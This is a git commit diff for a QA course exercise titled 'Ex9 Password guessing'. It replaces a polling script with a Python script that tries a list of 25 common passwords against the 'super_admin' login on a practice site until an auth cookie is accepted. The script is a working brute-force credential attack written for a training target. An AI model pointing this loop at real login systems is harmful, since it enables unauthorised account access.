38c451a43457fbc6984f2fccaaaa628bd7f8a8d4
Nastia Kuzina <miowch@gmail.com>
2022-02-03 00:19:04 +0100

    Ex9 Password guessing

--- main.py
+++ main.py
@@ -1,38 +1,55 @@
-import time
 import requests
 
-url = "https://playground.learnqa.ru/ajax/api/longtime_job"
+url_get_auth_cookie = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
+url_check_auth_cookie = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"
+
+login = "super_admin"
+common_passwords = ["123456",
+                    "123456789",
+                    "qwerty",
+                    "password",
+                    "1234567",
+                    "12345678",
+                    "12345",
+                    "iloveyou",
+                    "111111",
+                    "123123",
+                    "abc123",
+                    "qwerty123",
+                    "1q2w3e4r",
+                    "admin",
+                    "qwertyuiop",
+                    "654321",
+                    "555555",
+                    "lovely",
+                    "7777777",
+                    "welcome",
+                    "888888",
+                    "princess",
+                    "dragon",
+                    "password1",
+                    "123qwe"]
 
 
-def create_task():
-    response = requests.get(url)
-    return response.json()
+def find_password(login, passwords):
+    for password in passwords:
+        response = requests.post(url_get_auth_cookie, data={"login": f'{login}', "password": f'{password}'})
+        auth_cookie = response.cookies["auth_cookie"]
+
+        if is_authorized(auth_cookie):
+            print(f"You are authorized. Your password is {password}.")
+            break
 
 
-def is_ready(token):
-    response = requests.get(url, params={"token": f"{token}"})
-    match response.json()['status']:
-        case "Job is ready":
-            return True
-        case "Job is NOT ready":
+def is_authorized(auth_cookie):
+    response = requests.get(url_check_auth_cookie, cookies={"auth_cookie": f"{auth_cookie}"})
+    match response.text:
+        case "You are NOT authorized":
             return False
+        case "You are authorized":
+            return True
         case _:
-            print(f"Received status differs from expected ones: {response.json()['status']}")
+            print(f"Unexpected response: {response.text}")
 
 
-def wait_for_sec(sec):
-    time.sleep(sec)
-
-
-def get_result(token):
-    response = requests.get(url, params={"token": f"{token}"})
-    try:
-        return response.json()['result']
-    except KeyError:
-        print("There is not the result key.")
-
-
-task = create_task()
-assert not is_ready(task["token"])
-wait_for_sec(task["seconds"])
-print(get_result(task["token"]))
+find_password(login, common_passwords)
